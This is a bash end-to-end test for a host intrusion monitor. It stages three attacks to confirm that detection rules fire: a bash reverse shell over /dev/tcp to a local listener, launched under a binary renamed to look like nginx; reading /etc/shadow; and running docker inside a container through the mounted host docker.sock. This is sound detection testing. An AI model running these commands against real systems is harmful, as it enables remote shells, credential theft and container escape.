#!/bin/bash
# W4 D3-D4：3 条 DSL 示例规则端到端验证
# 用法（需 root）: bash tests/integration/test_dsl_e2e.sh
# 判定：攻击动作后 baseline.db alerts 表出现对应 3 个 dsl.* rule_id 的告警
#   dsl.reverse_shell_from_web_service  —— 伪造 nginx 父进程派生 bash（comm 欺骗）
#   dsl.read_etc_shadow_by_unusual_process —— cat /etc/shadow
#   dsl.docker_cli_executed_inside_container —— 容器内 docker ps（挂 docker.sock）
set -u
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
WORK=/home/sf/bg-dsl-e2e; PIDFILE=$WORK/monitor.pid; LOG=$WORK/monitor.log
cd "$ROOT_DIR"
mkdir -p "$WORK"

echo "=== 启动 monitor (attack-cases 配置 + rules/examples) ==="
if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
    kill -TERM "$(cat "$PIDFILE")" 2>/dev/null; sleep 2
fi
bash -c "echo \$\$ > '$PIDFILE'; exec '$ROOT_DIR/baseline-guard' monitor --db '$ROOT_DIR/baseline.db' -c '$ROOT_DIR/tests/attack-cases/config.yaml'" >"$LOG" 2>&1 &
for i in $(seq 1 40); do grep -q "Monitoring started" "$LOG" && break; sleep 0.5; done
grep -m1 'rule_engine' "$LOG"

echo "=== 攻击 1/3：伪造 Web 服务父进程派生 shell ==="
mkdir -p $WORK/fakeweb && cp /bin/bash $WORK/fakeweb/nginx
nc -l 127.0.0.1 4444 >/dev/null 2>&1 & NC=$!; sleep 0.5
timeout 3 $WORK/fakeweb/nginx -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1; sleep 1' >/dev/null 2>&1
kill $NC 2>/dev/null

echo "=== 攻击 2/3：cat /etc/shadow ==="
cat /etc/shadow > /dev/null

echo "=== 攻击 3/3：容器内执行 docker ==="
if docker info >/dev/null 2>&1; then
    if docker image inspect docker >/dev/null 2>&1 || docker pull docker >/dev/null 2>&1; then
        docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker sh -c "docker ps" >/dev/null 2>&1
    else
        docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v /usr/bin/docker:/usr/bin/docker:ro \
            --entrypoint docker bash:5 ps >/dev/null 2>&1 || echo "WARN: docker 攻击动作降级失败"
    fi
else
    echo "WARN: docker 不可用，攻击 3/3 跳过（判定将失败）"
fi

echo "=== 等落库 ==="
sleep 8

echo "=== 停止 monitor ==="
kill -TERM "$(cat "$PIDFILE")" 2>/dev/null
for i in $(seq 1 20); do kill -0 "$(cat "$PIDFILE")" 2>/dev/null || break; sleep 0.5; done

echo "--- 判定 ---"
PASS=0
for rid in dsl.reverse_shell_from_web_service dsl.read_etc_shadow_by_unusual_process dsl.docker_cli_executed_inside_container; do
    N=$(sqlite3 /var/lib/baseline-guard/baseline.db "select count(*) from alerts where rule_id='$rid';")
    if [ "$N" -ge 1 ]; then echo "  [PASS] $rid 告警 $N 条"; PASS=$((PASS+1));
    else echo "  [FAIL] $rid 无告警"; fi
done
echo "--- 样本（含 severity/attack 列）---"
sqlite3 /var/lib/baseline-guard/baseline.db "select rule_id, severity, attack, substr(actual,1,60) from alerts where rule_id like 'dsl.%' order by id desc limit 3;"
[ "$PASS" -eq 3 ] && { echo "DSL E2E: PASS (3/3)"; exit 0; } || { echo "DSL E2E: FAIL ($PASS/3)"; exit 1; }
